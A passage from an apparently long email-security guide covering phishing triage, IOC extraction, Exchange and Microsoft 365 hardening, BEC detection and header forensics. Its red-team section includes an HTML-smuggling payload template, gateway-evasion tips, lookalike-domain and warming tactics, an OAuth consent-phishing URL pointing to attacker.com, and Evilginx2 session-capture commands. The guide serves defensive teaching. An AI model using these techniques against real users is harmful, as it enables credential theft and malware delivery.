│    User      │───▶│  Submission  │───▶│   Triage     │───▶│ Remediation  │
│ Reports via  │    │  Mailbox or  │    │  (Auto +     │    │ (Delete from │
│ Report Button│    │  API         │    │   Manual)    │    │  all boxes)  │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
                                               │
                                               ▼
                                        ┌──────────────┐
                                        │  Intel Feed  │
                                        │  (IOC Export)│
                                        └──────────────┘
```

**Implementation steps:**

1. Deploy "Report Phishing" button in email clients (Microsoft Report Message add-in, Cofense Reporter, KnowBe4 Phish Alert Button)
2. Reports flow to a shared submissions mailbox or API endpoint
3. Automated triage: sandbox URLs/attachments, check threat intel, score confidence
4. High-confidence phishing: automated remediation (purge from all mailboxes)
5. Medium-confidence: queue for analyst review
6. Low-confidence (spam/marketing): auto-respond to user, no SOC action
7. Extract IOCs and feed to threat intelligence platform
8. Send feedback to reporting user (builds reporting culture)

### 5.3 Automated IOC Extraction from Emails

Extract indicators from reported phishing emails:

```python
#!/usr/bin/env python3
"""Extract IOCs from phishing email (.eml file)."""

import email
import re
import hashlib
from email import policy
from urllib.parse import urlparse

def extract_iocs(eml_path: str) -> dict:
    """Parse an .eml file and extract all IOCs."""
    
    with open(eml_path, 'rb') as f:
        msg = email.message_from_binary_file(f, policy=policy.default)
    
    iocs = {
        'urls': set(),
        'domains': set(),
        'ips': set(),
        'sender_addresses': set(),
        'attachment_hashes': [],
        'subjects': set(),
        'reply_to': set(),
    }
    
    # Extract sender
    if msg['from']:
        addr_match = re.search(r'<([^>]+)>', msg['from'])
        if addr_match:
            iocs['sender_addresses'].add(addr_match.group(1).lower())
    
    # Extract Reply-To (often different from From in phishing)
    if msg['reply-to']:
        addr_match = re.search(r'<([^>]+)>', msg['reply-to'])
        if addr_match:
            iocs['reply_to'].add(addr_match.group(1).lower())
    
    iocs['subjects'].add(msg['subject'] or '')
    
    # Extract URLs from body
    url_pattern = re.compile(
        r'https?://[^\s<>"\')\]]+', re.IGNORECASE
    )
    
    for part in msg.walk():
        content_type = part.get_content_type()
        
        if content_type in ('text/plain', 'text/html'):
            body = part.get_content()
            urls = url_pattern.findall(body)
            for url in urls:
                url = url.rstrip('.,;:')
                iocs['urls'].add(url)
                parsed = urlparse(url)
                if parsed.hostname:
                    iocs['domains'].add(parsed.hostname)
        
        # Hash attachments
        elif part.get_filename():
            payload = part.get_payload(decode=True)
            if payload:
                iocs['attachment_hashes'].append({
                    'filename': part.get_filename(),
                    'md5': hashlib.md5(payload).hexdigest(),
                    'sha256': hashlib.sha256(payload).hexdigest(),
                    'size': len(payload),
                })
    
    # Extract IPs
    ip_pattern = re.compile(
        r'\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}'
        r'(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b'
    )
    
    # Check Received headers for origin IPs
    for received in msg.get_all('received', []):
        ips = ip_pattern.findall(received)
        for ip in ips:
            if not ip.startswith(('10.', '172.16.', '192.168.', '127.')):
                iocs['ips'].add(ip)
    
    return iocs
```

### 5.4 Threat Intelligence Integration

Checking extracted IOCs against threat intelligence:

- **URLs:** VirusTotal, URLhaus, PhishTank, OpenPhish, Google Safe Browsing
- **IPs:** AbuseIPDB, Shodan, GreyNoise, AlienVault OTX
- **Domains:** DomainTools, PassiveTotal, WHOIS history, certificate transparency
- **File hashes:** VirusTotal, MalwareBazaar, Hybrid Analysis, CAPE sandbox

Integration approaches:
- STIX/TAXII feeds for structured threat intel consumption
- MISP (Malware Information Sharing Platform) for collaborative intel
- TheHive + Cortex for automated IOC enrichment
- SOAR platform playbooks for automated triage workflows

### 5.5 Email Trace and Message Tracking

**Microsoft 365 Message Trace:**

```powershell
# Trace messages from specific sender in last 48 hours
Get-MessageTrace -SenderAddress "suspicious@external.com" `
    -StartDate (Get-Date).AddHours(-48) `
    -EndDate (Get-Date) |
    Select-Object Received, SenderAddress, RecipientAddress, Subject, Status, MessageTraceId

# Detailed trace for specific message
Get-MessageTraceDetail -MessageTraceId "<trace-id>" -RecipientAddress "user@example.com" |
    Select-Object Date, Event, Action, Detail

# Find all recipients of a specific phishing campaign (by subject)
Get-MessageTrace -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) |
    Where-Object { $_.Subject -like "*Invoice Payment*" -and $_.SenderAddress -eq "attacker@malicious.com" } |
    Select-Object RecipientAddress, Status, Received

# Extended message trace (historical, > 7 days)
Start-HistoricalSearch -ReportTitle "Phishing Investigation" `
    -StartDate "2026-04-01" -EndDate "2026-05-01" `
    -SenderAddress "suspicious@domain.com" `
    -ReportType MessageTrace `
    -NotifyAddress "secops@example.com"
```

### 5.6 Mail Flow Rules for Conditional Routing

**Exchange Online Transport Rules:**

```powershell
# External email warning banner
New-TransportRule -Name "External Email Warning" `
    -FromScope "NotInOrganization" `
    -ApplyHtmlDisclaimerLocation "Prepend" `
    -ApplyHtmlDisclaimerText '<div style="background-color:#FFEB3B;padding:10px;border:1px solid #F57F17;margin-bottom:10px;"><b>⚠ EXTERNAL:</b> This email originated outside the organization. Exercise caution with links and attachments.</div>' `
    -ApplyHtmlDisclaimerFallbackAction Wrap

# Block auto-forwarding to external domains
New-TransportRule -Name "Block External Auto-Forward" `
    -FromScope "InOrganization" `
    -SentToScope "NotInOrganization" `
    -MessageTypeMatches "AutoForward" `
    -RejectMessageReasonText "External auto-forwarding is not permitted. Contact IT Security." `
    -Priority 0

# Quarantine encrypted attachments from external senders
New-TransportRule -Name "Quarantine Password-Protected Attachments" `
    -FromScope "NotInOrganization" `
    -ApplyRightsProtectionTemplate "Encrypt" `
    -AttachmentIsPasswordProtected $true `
    -SetSCL 9 `
    -SetHeaderName "X-Quarantine-Reason" `
    -SetHeaderValue "password-protected-attachment-external"

# Route executive-targeted mail through additional scanning
New-TransportRule -Name "VIP Additional Scanning" `
    -SentTo "ceo@example.com","cfo@example.com","coo@example.com" `
    -FromScope "NotInOrganization" `
    -SetHeaderName "X-VIP-Scan" `
    -SetHeaderValue "true" `
    -RouteMessageOutboundConnector "Advanced-Scanning-Connector"
```

---

## 6. Attacchi Email — Red Team Perspective

### 6.1 Phishing Infrastructure Setup

#### GoPhish

GoPhish is the standard open-source phishing simulation platform:

```bash
# Download and install GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d /opt/gophish
chmod +x /opt/gophish/gophish

# Generate TLS certificate for admin panel
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /opt/gophish/gophish_admin.key \
    -out /opt/gophish/gophish_admin.crt \
    -subj "/CN=phish-admin.internal"

# Configuration
cat > /opt/gophish/config.json << 'EOF'
{
    "admin_server": {
        "listen_url": "127.0.0.1:3333",
        "use_tls": true,
        "cert_path": "gophish_admin.crt",
        "key_path": "gophish_admin.key"
    },
    "phish_server": {
        "listen_url": "0.0.0.0:443",
        "use_tls": true,
        "cert_path": "/etc/letsencrypt/live/login-portal.example.com/fullchain.pem",
        "key_path": "/etc/letsencrypt/live/login-portal.example.com/privkey.pem"
    },
    "db_name": "sqlite3",
    "db_path": "gophish.db",
    "migrations_prefix": "db/db_",
    "contact_address": "security-team@example.com",
    "logging": {
        "filename": "gophish.log",
        "level": "info"
    }
}
EOF
```

#### King Phisher

King Phisher provides more advanced campaign management:
- SMS phishing (smishing) support
- Calendar event injection
- Two-factor authentication phishing pages
- Credential validation against target's actual auth endpoint (verify captured creds are valid)
- Advanced campaign analytics and timeline visualization

#### Evilginx2

Adversary-in-the-middle phishing framework (covered in detail in section 6.5).

### 6.2 Domain Selection and Warming

#### Lookalike Domain Strategies

Domain selection is critical for bypassing both human and automated detection:

**Character substitution:**
- `microsoftonline-login.com`
- `0ffice365.com` (zero for O)
- `sharepo1nt.com` (one for L)

**Subdomain abuse:**
- `login.microsoftonline.com.attacker.com` (subdomain with target brand)
- `outlook.office.com-verify.attacker.com`

**TLD variations:**
- `example.co` instead of `example.com`
- `example.cloud`, `example.app`, `example.dev`

**Hyphenation:**
- `example-secure.com`
- `example-portal.com`

**Typosquatting:**
- `exmaple.com` (transposition)
- `exampl.com` (omission)

#### Domain Warming

New domains are heavily scrutinized. Warming process:

1. **Register domain 30+ days before campaign** — age improves reputation
2. **Configure proper DNS** — set up SPF, DKIM, DMARC, MX records
3. **Set up legitimate-looking website** — copy target's design, add SSL
4. **Send legitimate emails** — subscribe to newsletters, send benign correspondence
5. **Build domain reputation** — categorize domain with web filters (submit to categorization services)
6. **Configure matching PTR record** — reverse DNS must resolve
7. **Use a reputable hosting provider** — avoid known bulletproof hosting

#### Aged Domain Acquisition

Purchasing expired domains that previously had legitimate use:
- Check domain history via Wayback Machine
- Verify no existing blacklist entries
- Confirm existing SPF/DKIM records haven't been inherited
- Check domain categorization (is it already categorized as "business"?)

### 6.3 Bypassing Email Security

#### HTML Smuggling

Delivers malicious payloads by constructing them client-side via JavaScript in an HTML attachment:

```html
<!-- HTML smuggling payload — attachment.html -->
<html>
<body>
<script>
// Base64 encoded malicious payload
var payload = "TVqQAAMAAAAEAAAA..."; // PE file in base64

// Decode and create blob
var binary = atob(payload);
var array = new Uint8Array(binary.length);
for (var i = 0; i < binary.length; i++) {
    array[i] = binary.charCodeAt(i);
}
var blob = new Blob([array], {type: 'application/octet-stream'});

// Trigger download
var link = document.createElement('a');
link.href = URL.createObjectURL(blob);
link.download = "Report_Q4_2025.exe";
document.body.appendChild(link);
link.click();
</script>
<p>Your document is downloading...</p>
</body>
</html>
```

This bypasses gateway scanning because the HTML file itself is not malicious — the payload is assembled in the victim's browser.

#### Encrypted/Password-Protected Attachments

- Send a password-protected ZIP containing the malicious payload
- Include the password in the email body
- Gateway cannot inspect the attachment content without the password
- Some gateways now extract passwords from the email body and use them to decrypt attachments

#### QR Code Delivery

- Embed phishing URL in a QR code image
- QR codes bypass URL rewriting and link scanning
- Target mobile devices which typically have weaker security controls
- Pair with urgency ("Scan to verify your MFA enrollment")

#### Callback Phishing (BazarCall)

- No links, no attachments — just a phone number
- Email claims a subscription/charge that needs cancellation
- Victim calls the number, attacker provides "cancellation instructions"
- Instructions involve installing remote access tools or running PowerShell
- Extremely difficult to detect with email security tools

### 6.4 OAuth Phishing — Consent Grant Attacks

Instead of stealing passwords, OAuth phishing tricks users into granting an attacker-controlled application access to their data:

```
Attack Flow:
1. Attacker registers malicious OAuth app (e.g., "Document Viewer Pro")
2. Phishing email contains OAuth consent URL:
   https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
   client_id=<attacker_app_id>&
   response_type=code&
   redirect_uri=https://attacker.com/callback&
   scope=Mail.Read Mail.Send Files.ReadWrite.All offline_access
3. User authenticates legitimately to Microsoft (not a fake page)
4. User clicks "Accept" on permissions consent screen
5. Attacker receives OAuth tokens with granted permissions
6. Attacker accesses mail, sends emails as user, exfiltrates files
```

This bypasses MFA entirely because the user authenticates normally. Detection:
- Monitor Azure AD sign-in logs for unusual application consent grants
- Alert on applications requesting high-privilege scopes (Mail.Send, Files.ReadWrite.All)
- Implement admin consent workflow — block user self-consent for risky permissions
- Regularly audit OAuth application permissions

### 6.5 Adversary-in-the-Middle Phishing

#### Evilginx2

Evilginx2 operates as a reverse proxy between the victim and the legitimate authentication server:

```
Victim → Evilginx2 Proxy → Legitimate Auth Server
         (captures session      (Microsoft 365,
          tokens and cookies)    Google, etc.)
```

The victim sees the real login page (proxied), enters real credentials, completes real MFA, and the attacker captures the resulting session token.

```bash
# Evilginx2 phishlet configuration example (Microsoft 365)
# This captures session tokens that bypass MFA

# Setup commands in Evilginx2:
config domain attacker-infra.com
config ipv4 203.0.113.50

phishlets hostname o365 login.attacker-infra.com
phishlets enable o365

lures create o365
lures edit 0 redirect_url https://office.com
lures get-url 0
# Outputs: https://login.attacker-infra.com/xyz123
```

**Detection:**
- Impossible travel alerts (login from user's location, then immediately from proxy IP)
- Token replay detection (same session used from different IPs)
- Conditional Access policies requiring compliant/managed devices
- FIDO2/passkeys (phishing-resistant MFA — cannot be proxied)
- Monitoring for authentication from known proxy infrastructure

#### Modlishka

Similar AitM framework with automated certificate generation and session capture. Operates on the same principle as Evilginx2 but with different operational characteristics.

### 6.6 Spear-Phishing with OSINT

OSINT gathering for targeted phishing:

**LinkedIn:**
- Organizational structure, reporting lines
- Job titles and responsibilities
- New hires (prime targets — unfamiliar with internal processes)
- Technology stack (from job postings)
- Business relationships and partnerships

**Social media:**
- Personal interests for lure customization
- Travel schedules (CEO traveling = opportunity for BEC)
- Conference attendance (pretext for follow-up emails)

**Corporate filings:**
- Financial information for invoice fraud pretexts
- M&A activity for impersonation scenarios
- Supplier/vendor relationships

**Technical OSINT:**
- Email format (first.last@, flast@) via hunter.io, email permutator
- MX records reveal email platform (Exchange, Google, Proofpoint)
- SPF records reveal third-party email services
- Employee email addresses from breach databases

---

## 7. Business Email Compromise

### 7.1 BEC Attack Flow

```
┌───────────────┐    ┌──────────────────┐    ┌───────────────────┐    ┌──────────────┐
│Reconnaissance │───▶│ Domain Spoofing / │───▶│ Social Engineering │───▶│   Payment    │
│               │    │ Account Compromise│    │                    │    │ Redirection  │
└───────────────┘    └──────────────────┘    └───────────────────┘    └──────────────┘
```

**Phase 1 — Reconnaissance:**
- Identify target organization's payment processes
- Map approval chains (who authorizes payments?)
- Identify key vendors and their invoice patterns
- Determine email formats and communication styles
- Timeline: days to weeks

**Phase 2 — Domain Spoofing or Account Compromise:**
- Register lookalike domain OR
- Compromise actual executive/vendor mailbox via credential phishing
- If compromised: create mailbox rules to hide attacker's activity
- Set up reply infrastructure (receiving domain for redirected responses)

**Phase 3 — Social Engineering:**
- Impersonate executive or vendor
- Request wire transfer change, invoice payment, or sensitive data
- Create urgency ("deal closing today", "confidential M&A")
- Leverage authority ("CEO requesting", "partner firm requirement")
- Often timed to coincide with executive travel (harder to verify by phone)

**Phase 4 — Payment Redirection:**
- Provide new banking details (controlled by money mules)
- Or request gift card purchases
- Or redirect payroll deposits
- Funds moved through multiple accounts and jurisdictions rapidly

### 7.2 Detecting Compromised Mailboxes

**Impossible Travel Detection:**
```powershell
# Search for impossible travel in Azure AD sign-in logs
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
    -Operations "UserLoggedIn" -ResultSize 5000 |
    ConvertFrom-Json |
    Select-Object CreationDate, UserId, ClientIP, 
        @{n='Location';e={$_.ExtendedProperties | Where-Object {$_.Name -eq 'Location'} | Select-Object -ExpandProperty Value}}
```

**Suspicious Mailbox Rules:**
```powershell
# Detect inbox rules that hide emails (common BEC persistence)
Get-InboxRule -Mailbox "compromised-user@example.com" |
    Where-Object {
        $_.DeleteMessage -eq $true -or
        $_.MoveToFolder -like "*RSS*" -or
        $_.MoveToFolder -like "*Deleted*" -or
        $_.MarkAsRead -eq $true
    } |
    Select-Object Name, Description, MoveToFolder, DeleteMessage, From, SubjectContainsWords

# Search all mailboxes for suspicious rules
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    $rules = Get-InboxRule -Mailbox $_.UserPrincipalName -ErrorAction SilentlyContinue |
        Where-Object { $_.DeleteMessage -eq $true -or $_.ForwardTo -ne $null -or $_.ForwardAsAttachmentTo -ne $null }
    if ($rules) {
        [PSCustomObject]@{
            Mailbox = $_.UserPrincipalName
            Rules = ($rules | Select-Object Name, DeleteMessage, ForwardTo, ForwardAsAttachmentTo)
        }
    }
}
```

**Forwarding Rules Detection:**
```powershell
# Find all mailboxes with external forwarding configured
Get-Mailbox -ResultSize Unlimited |
    Where-Object { $_.ForwardingSmtpAddress -ne $null -or $_.ForwardingAddress -ne $null } |
    Select-Object UserPrincipalName, ForwardingSmtpAddress, ForwardingAddress, DeliverToMailboxAndForward

# Find transport rules creating forwarding
Get-TransportRule | Where-Object {
    $_.BlindCopyTo -ne $null -or
    $_.CopyTo -ne $null -or
    $_.RedirectMessageTo -ne $null
} | Select-Object Name, State, BlindCopyTo, RedirectMessageTo
```

### 7.3 Payment Fraud Prevention

**Out-of-Band Verification Protocol:**

1. Any payment change request (new bank details, new payee, amount change) requires verbal confirmation via a pre-established phone number (not from the email)
2. Verification must use a known-good contact number from the vendor management system, not from the requesting email
3. Two-person authorization for wire transfers above threshold
4. 24-hour hold on new banking detail changes
5. Automated alerts when payment instructions change for existing vendors

**Technical Controls:**
- DLP rules flagging emails containing banking details from external senders
- Transport rules tagging emails requesting wire transfers or payment changes
- Banner warnings on emails from newly registered external domains
- Velocity checks on payment approval systems

### 7.4 Executive Protection Programs

- Dedicated anti-impersonation policies for C-suite and finance personnel
- Domain monitoring for registration of lookalike domains
- Dark web monitoring for executive credential exposure
- Executive email accounts on highest sensitivity tier
- Mandatory phishing-resistant MFA (FIDO2 keys) for executives
- Personal device security assessments
- Travel security protocols (VPN enforcement, device hardening)

---

## 8. Email Forensics

### 8.1 Email Header Analysis Deep Dive

#### Received Headers (Bottom-Up Reading)

```
Received: from edge-protection.example.com (edge-protection.example.com [10.0.0.50])
    by mailbox-server.example.com (Postfix) with ESMTP id ABC123
    for <victim@example.com>; Wed, 07 May 2025 14:30:02 +0000 (UTC)
Received: from relay.attacker-infra.net (unknown [203.0.113.99])
    by edge-protection.example.com (Postfix) with ESMTP id DEF456
    for <victim@example.com>; Wed, 07 May 2025 14:29:58 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
    by relay.attacker-infra.net (Postfix) with ESMTP id GHI789;
    Wed, 07 May 2025 14:29:55 +0000 (UTC)
```

**Reading order:** Bottom to top. The bottom-most `Received:` header is closest to the origin. Each subsequent header is added by the next server in the chain.

**Key analysis points:**
- First external IP: `203.0.113.99` — this is the true origin server
- `unknown` in parentheses means reverse DNS didn't match the HELO name
- Timestamp gaps between hops can indicate queuing or deliberate delays
- Internal headers (10.x.x.x) show your infrastructure processing

#### X-Headers

Non-standard headers added by various systems:

```
X-Mailer: Microsoft Outlook 16.0
X-Originating-IP: [203.0.113.99]
X-Spam-Status: Yes, score=8.5 required=5.0
X-Spam-Flag: YES
X-MS-Exchange-Organization-AuthAs: Anonymous
X-MS-Exchange-Organization-SCL: 5
X-Forefront-Antispam-Report: CIP:203.0.113.99;CTRY:RU;LANG:en;
X-Microsoft-Antispam: BCL:0;
X-MS-Exchange-CrossTenant-AuthAs: Anonymous
```

Forensically valuable X-headers:
- `X-Originating-IP` — client IP of the sender (webmail)
- `X-Mailer` / `User-Agent` — email client used
- `X-MS-Exchange-Organization-AuthAs` — authentication method (Anonymous = unauthenticated external)
- `X-Forefront-Antispam-Report` — Microsoft's spam analysis including source country (CTRY)

#### Authentication-Results Header

```
Authentication-Results: mx.example.com;
    dkim=pass (2048-bit key; unprotected) header.d=sender.com header.s=selector1;
    spf=pass (mx.example.com: domain of bounce@sender.com designates 198.51.100.1 as permitted sender) smtp.mailfrom=bounce@sender.com;
    dmarc=pass (p=reject dis=none) header.from=sender.com;
    compauth=pass reason=100
```

A failed authentication result with `p=none` and spoofed `From:` header is a strong phishing indicator.

### 8.2 Identifying True Sender Origin

Methodology:

1. **Start with lowest `Received:` header** — identify the originating IP
2. **WHOIS the originating IP** — determine hosting provider, ASN, country
3. **Check if IP matches claimed sending infrastructure** — does it belong to the domain's mail servers?
4. **Verify SPF result** — did the IP pass SPF for the claimed domain?
5. **Check DKIM signature** — does `d=` match the `From:` domain? Did it verify?
6. **Examine Message-ID format** — legitimate servers have consistent Message-ID patterns
7. **Check X-Originating-IP** — if present, this reveals the actual client

### 8.3 Tracing Through Multiple Hops

When investigating forwarded or relayed messages:

1. Map the complete `Received:` header chain with timestamps
2. Identify where the message entered your infrastructure (first internal hop)
3. Identify the last external hop before your perimeter
4. Check ARC headers for authentication state at each intermediary
5. Note any headers that seem fabricated (inconsistent timestamps, impossible ordering, unknown server names with no PTR records)

Forged `Received:` headers:
- Legitimate headers always have consistent timezone formatting
- Internal IPs in external headers are suspicious
- `by` hostname must be resolvable and match the next hop's connecting IP
- Timestamps must be chronologically consistent (later hops = later times)

### 8.4 Email Metadata as Evidence

Email metadata constitutes digital evidence. Preservation requirements:

- Original `.eml` or `.msg` file with all headers intact
- Hash the original file (SHA-256) immediately upon acquisition
- Document chain of custody
- Preserve in read-only storage with access logging
- Record UTC timestamp of acquisition
- Capture network logs corroborating the email transaction (MTA logs)

### 8.5 eDiscovery Considerations

- Custodian identification — who are the relevant mailbox owners?
- Date range scoping — relevant time period for collection
- Search terms and keywords for targeted collection
- Privilege filtering — attorney-client communications excluded
- De-duplication strategy (exact hash vs near-duplicate detection)
- Threading reconstruction — reconstruct conversation threads
- Metadata preservation through processing pipeline

### 8.6 Legal Preservation — Litigation Hold

**Journal Rules (Exchange):**
```powershell
# Create journal rule for legal hold
New-JournalRule -Name "Legal Hold - Project Alpha" `
    -JournalEmailAddress "journal-archive@example.com" `
    -Scope Global `
    -Recipient "target-user@example.com" `
    -Enabled $true

# In-Place Hold (preserves deleted items)
New-MailboxSearch -Name "Legal Hold - Project Alpha" `
    -SourceMailboxes "target-user@example.com" `
    -InPlaceHoldEnabled $true `
    -InPlaceHoldIdentity "UniqueHoldID"
```

**Microsoft 365 Litigation Hold:**
```powershell
# Enable litigation hold on specific mailbox
Set-Mailbox -Identity "target-user@example.com" `
    -LitigationHoldEnabled $true `
    -LitigationHoldDuration 365 `
    -RetentionComment "Legal hold per case #2026-001" `
    -RetentionUrl "https://legal.example.com/holds/2026-001"

# Verify hold status
Get-Mailbox "target-user@example.com" | 
    Select-Object LitigationHoldEnabled, LitigationHoldDate, LitigationHoldDuration
```

### 8.7 Email Header Analysis Tools

**MXToolbox Header Analyzer:** Web-based tool that parses and visualizes email header chains, highlighting delays and authentication results.

**Google Admin Toolbox — Messageheader:** Parses headers and shows hop-by-hop analysis with timestamps and delays.

**mail-header-analyzer (CLI):**
```bash
# Install
pip install mail-header-analyzer

# Analyze header file
mha analyze headers.txt --output json
```

**Custom header parsing:**
```bash
# Extract all Received headers from an .eml file
grep -E "^Received:" message.eml

# Extract authentication results
grep -E "^Authentication-Results:" message.eml

# Quick sender origin identification
grep -E "^Received: from" message.eml | tail -1
```

---

## 9. Microsoft 365 / Google Workspace Security

### 9.1 Conditional Access for Email

```powershell
# Azure AD Conditional Access — Require compliant device for email
# (Configured via Graph API or Azure Portal; conceptual PowerShell representation)

# Block legacy authentication (POP, IMAP, SMTP AUTH)
# This prevents password spray attacks against email protocols
New-AzureADMSConditionalAccessPolicy -DisplayName "Block Legacy Auth" `
    -Conditions @{
        ClientAppTypes = @("ExchangeActiveSync", "Other")
        Applications = @{ IncludeApplications = @("All") }
        Users = @{ IncludeUsers = @("All") }
    } `
    -GrantControls @{ BuiltInControls = @("Block") }
```

Key Conditional Access policies for email security:
- Block legacy authentication protocols (IMAP, POP3, SMTP AUTH) — required for MFA to be effective
- Require managed/compliant devices for Exchange Online
- Require MFA for Exchange Online access from non-trusted locations
- Block access from high-risk countries (unless business need exists)
- Session controls: limited session duration, app-enforced restrictions

### 9.2 DLP Policies for Email Content

```powershell
# Create DLP policy to detect credit card numbers in outbound email
New-DlpCompliancePolicy -Name "PCI - Credit Card Detection" `
    -ExchangeLocation All `
    -Mode Enable

New-DlpComplianceRule -Name "Block CC in Email" `
    -Policy "PCI - Credit Card Detection" `
    -ContentContainsSensitiveInformation @{
        Name = "Credit Card Number"
        minCount = 1
        confidenceLevel = "High"
    } `
    -BlockAccess $true `
    -NotifyUser "SenderNotifyOnly" `
    -GenerateIncidentReport "SiteAdmin" `
    -IncidentReportContent "All"
```

DLP rules to implement:
- PII detection (SSN, credit cards, passport numbers)
- Financial data (IBAN, SWIFT codes, account numbers)
- Healthcare data (patient identifiers, medical record numbers)
- Source code detection (prevent IP exfiltration via email)
- Custom patterns (internal project codes, classified markings)

### 9.3 Sensitivity Labels and Encryption

#### S/MIME (Certificate-Based)

```powershell
# Configure S/MIME for a mailbox (certificate already deployed)
Set-SmimeConfig -OWAAllowUserChoiceOfSigningCertificate $true
Set-SmimeConfig -OWACheckCRLOnSend $true
Set-SmimeConfig -OWAEncryptionAlgorithms "AES256-CBC"

# Per-user S/MIME settings
Set-Mailbox "executive@example.com" -SmimeEncryptByDefault $true
```

#### Office Message Encryption (OME)

```powershell
# Configure OME template
Set-OMEConfiguration -Identity "Confidential" `
    -ExternalMailExpiryInDays 7 `
    -IntroductionText "This message is encrypted. Verify your identity to read it." `
    -OTPEnabled $true `
    -SocialIdSignIn $false

# Transport rule to auto-encrypt based on sensitivity
New-TransportRule -Name "Encrypt Confidential Emails" `
    -ApplyRightsProtectionTemplate "Encrypt" `
    -SentToScope "NotInOrganization" `
    -HeaderContainsMessageHeader "msip_labels" `
    -HeaderContainsWords "Confidential"
```

### 9.4 Mailbox Audit Logging

```powershell
# Enable mailbox auditing (enabled by default in M365 since 2019)
Set-OrganizationConfig -AuditDisabled $false

# Verify auditing is enabled
Get-OrganizationConfig | Select-Object AuditDisabled

# Configure additional actions to audit
Set-Mailbox "user@example.com" -AuditEnabled $true `
    -AuditOwner @{Add="MailItemsAccessed","Send","SearchQueryInitiated"} `
    -AuditDelegate @{Add="SendAs","SendOnBehalf","MoveToDeletedItems","SoftDelete","HardDelete"} `
    -AuditAdmin @{Add="Send","SearchQueryInitiated"}

# Search mailbox audit logs for suspicious activity
Search-MailboxAuditLog -Identity "user@example.com" `
    -LogonTypes Owner,Delegate,Admin `
    -StartDate (Get-Date).AddDays(-7) `
    -EndDate (Get-Date) `
    -ShowDetails |
    Where-Object { $_.Operation -in "MailItemsAccessed","Send","MoveToDeletedItems" } |
    Select-Object Operation, OperationResult, LogonType, ClientIPAddress, ItemSubject
```

### 9.5 Unified Audit Log Analysis

```powershell
# Search for suspicious email-related activities
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
    -Operations "Set-InboxRule","New-InboxRule","Set-Mailbox","Set-TransportRule" `
    -ResultSize 5000 |
    Select-Object CreationDate, UserIds, Operations, AuditData

# Detect OAuth application consent grants (OAuth phishing indicator)
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
    -Operations "Consent to application" `
    -ResultSize 5000 |
    ForEach-Object {
        $audit = $_.AuditData | ConvertFrom-Json
        [PSCustomObject]@{
            Timestamp = $_.CreationDate
            User = $_.UserIds
            AppName = ($audit.ModifiedProperties | Where-Object {$_.Name -eq "ConsentContext.ServicePrincipalName"}).NewValue
            Permissions = ($audit.ModifiedProperties | Where-Object {$_.Name -eq "ConsentContext.Permissions"}).NewValue
        }
    }

# Detect mail forwarding rule changes
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
    -Operations "Set-Mailbox","New-InboxRule","Set-InboxRule" `
    -ResultSize 5000 |
    ForEach-Object {
        $audit = $_.AuditData | ConvertFrom-Json
        if ($audit.Parameters | Where-Object { $_.Name -in "ForwardingSmtpAddress","ForwardTo","RedirectTo" }) {
            [PSCustomObject]@{
                Timestamp = $_.CreationDate
                User = $_.UserIds
                Operation = $_.Operations
                Parameters = ($audit.Parameters | ConvertTo-Json -Compress)
            }
        }
    }
```

### 9.6 Admin Activity Monitoring

```powershell
# Monitor admin mailbox access (admin snooping detection)
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
    -Operations "MailItemsAccessed" `
    -FreeText "AdminAudit" |
    Where-Object { $_.UserIds -ne $_.ObjectId } |
    Select-Object CreationDate, UserIds, Operations

# Detect transport rule modifications
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
    -Operations "New-TransportRule","Set-TransportRule","Remove-TransportRule" `
    -ResultSize 1000 |
    Select-Object CreationDate, UserIds, Operations, AuditData

# Alert on connector changes (mail routing manipulation)
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
    -Operations "New-InboundConnector","Set-InboundConnector","New-OutboundConnector","Set-OutboundConnector" `
    -ResultSize 1000
```

### 9.7 EOP vs Defender for Office 365

| Feature | EOP (Plan 1) | Defender Plan 1 | Defender Plan 2 |
|---------|--------------|-----------------|-----------------|
| Anti-malware | Yes | Yes | Yes |
| Anti-spam | Yes | Yes | Yes |
| Connection filtering | Yes | Yes | Yes |
| SPF/DKIM/DMARC | Yes | Yes | Yes |
| Safe Attachments | No | Yes | Yes |
| Safe Links | No | Yes | Yes |
| Anti-phishing (impersonation) | Basic | Advanced | Advanced |
| Real-time detections | No | Yes | Yes |
| Threat Explorer | No | No | Yes |
| AIR (Automated Investigation) | No | No | Yes |
| Attack simulation training | No | No | Yes |
| Campaign views | No | No | Yes |
| Threat Trackers | No | No | Yes |
| Priority account protection | No | Limited | Yes |

**Recommendation:** Defender Plan 2 is the minimum for organizations with significant email-borne risk exposure. Plan 1 is acceptable only for low-risk environments or as supplementary protection alongside a third-party SEG.

### 9.8 Google Workspace Security

Key Google Workspace email security configurations:

- **Advanced phishing and malware protection:** Enable all settings under Admin Console → Security → Gmail
- **Security sandbox:** Enable for attachment detonation (available in Enterprise tier)
- **Confidential mode:** Expiring messages with IRM controls
- **DLP rules:** Content compliance rules for sensitive data in transit
- **DMARC enforcement:** Via DNS (same records apply)
- **OAuth app whitelisting:** Block third-party app access unless explicitly approved
- **Alert Center:** Real-time notifications for suspicious email activity
- **Investigation tool:** Search and remediate messages across the organization

---

## 10. Laboratorio

### 10.1 Deploy: Postfix + Rspamd + ClamAV Gateway

#### Infrastructure Setup

```bash
#!/bin/bash
# Lab deployment script — Postfix + Rspamd + ClamAV email gateway
# Target: Ubuntu 24.04 LTS / Debian 12

set -euo pipefail

DOMAIN="lab.example.com"
HOSTNAME="mail.${DOMAIN}"
ADMIN_EMAIL="admin@${DOMAIN}"

# System preparation
